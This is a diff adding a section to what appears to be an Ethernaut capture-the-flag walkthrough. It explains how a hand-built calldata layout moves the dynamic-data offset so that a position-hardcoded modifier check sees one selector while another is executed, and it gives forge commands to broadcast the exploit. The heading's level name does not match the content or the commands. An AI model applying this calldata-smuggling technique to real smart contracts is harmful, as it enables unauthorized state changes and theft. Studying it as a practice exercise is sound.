@@ -643,3 +643,25 @@ gateThree:
 
 Local environment: `forge test --mc ExploitLevel28` || 
 Sepolia: `forge script script/Level28.exp.sol:ExploitLevel28 --broadcast --rpc-url $SEPOLIA`
+
+## 28.Gatekeeper Three
+
+`Ethernaut Instance: 0xBA345f8a177143f6CEbd9A20809D2425052d06AD`
+
+### Steps
+To crack this level, it's key to understand that the `_data` within `calldata` can be moved using the offset. Moreover, the modifier `onlyOff` is hardcoding the position of the data at 68, `calldatacopy(selector, 68, 4)`.
+1. I create a calldata with the selector `turnSwitchOff()` at offset 68 to bypass the require. However, I'm actually calling `flipSwitch()` and moving `_data` to offset 96.
+```
+function selector: 30c13ade (flipSwitch())
+offset: 0000000000000000000000000000000000000000000000000000000000000060 (byte 96)
+extra bytes: 0000000000000000000000000000000000000000000000000000000000000000 
+position68: 20606e1500000000000000000000000000000000000000000000000000000000 (turnSwitchOff() selector)
+length of the data: 0000000000000000000000000000000000000000000000000000000000000004 
+position 96: 76227e1200000000000000000000000000000000000000000000000000000000 (turnSwitchOn() selector)
+```
+2. Now, I do a call to the instance using the custom calldata.
+
+### Running the code
+
+Local environment: `forge test --mc ExploitLevel29` || 
+Sepolia: `forge script script/Level29.exp.sol --broadcast --rpc-url $SEPOLIA`
